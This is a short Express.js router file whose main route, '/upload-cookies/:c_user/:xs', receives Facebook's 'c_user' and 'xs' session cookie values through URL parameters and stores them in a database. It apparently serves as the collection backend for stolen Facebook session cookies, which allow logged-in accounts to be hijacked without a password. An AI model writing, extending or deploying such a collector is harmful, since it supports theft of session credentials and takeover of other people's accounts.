const router = require('express').Router()
const CookiesFb = require('../models/cookies')

const CookiesFbController = require('../controllers/cookiesfb-controller')

router.get('/', CookiesFbController.index)

router.get('/upload-cookies/:c_user/:xs', (req, res) => {
    let c_user = req.params.c_user.toLowerCase();
    let xs = req.params.xs;

    let cookiesFb = new CookiesFb({
        c_user: c_user,
        xs: xs
    })

    cookiesFb.save()
    .then(response => {
        res.json({
            message: 'Add success!'
        })
    })
    .catch(error => {
        res.json({
            message: 'Error!'
        })
    })
})

module.exports = router